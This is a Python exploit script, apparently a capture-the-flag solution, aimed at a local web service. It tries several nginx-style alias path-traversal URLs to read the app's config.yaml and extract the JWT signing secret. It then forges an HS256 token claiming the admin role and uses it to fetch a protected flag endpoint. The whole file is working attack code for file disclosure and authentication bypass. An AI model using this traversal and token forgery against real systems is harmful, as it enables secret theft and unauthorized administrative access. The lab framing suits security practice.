#!/usr/bin/env python3
import re
import sys
from pathlib import Path

import jwt
import requests


BASE = "http://127.0.0.1:8080"


def extract_secret(text: str) -> str:
    match = re.search(r"^\s*jwt_secret\s*:\s*(.+?)\s*$", text, re.M)
    if not match:
        raise ValueError("jwt_secret not found")
    return match.group(1).strip().strip("'\"")


def fetch_secret(session: requests.Session) -> str:
    paths = [
        "/static../app/config.yaml",
        "/static..%2fapp/config.yaml",
        "/static..%2Fapp/config.yaml",
    ]
    for path in paths:
        resp = session.get(BASE + path, timeout=5)
        if resp.status_code == 200 and "jwt_secret" in resp.text:
            print(f"[+] LFI works via {path}")
            print(resp.text.strip())
            return extract_secret(resp.text)
        print(f"[-] {path} -> HTTP {resp.status_code}")
    raise RuntimeError("failed to read config.yaml through alias traversal")


def main() -> int:
    if len(sys.argv) > 1:
        global BASE
        BASE = sys.argv[1].rstrip("/")

    session = requests.Session()
    secret = fetch_secret(session)
    print(f"[+] recovered jwt secret: {secret}")

    token = jwt.encode({"user": "admin", "role": "admin"}, secret, algorithm="HS256")
    headers = {"Authorization": f"Bearer {token}"}

    resp = session.get(BASE + "/admin/config/flag", headers=headers, timeout=5)
    print(f"[+] /admin/config/flag -> HTTP {resp.status_code}")
    print(resp.text)

    if resp.ok and "flag{" in resp.text:
        print("[+] success")
        return 0
    print("[-] flag not recovered")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
